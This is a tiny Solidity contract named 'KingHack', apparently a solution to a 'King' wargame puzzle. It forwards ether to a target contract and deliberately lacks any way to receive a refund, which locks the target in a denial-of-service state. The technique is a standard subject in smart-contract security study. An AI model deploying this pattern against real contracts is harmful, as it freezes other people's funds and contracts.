// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract KingHack {

  function hack (address _target) public payable {
    (bool result,) = _target.call{value:msg.value}("");
    if(!result) revert();
  }
  
}
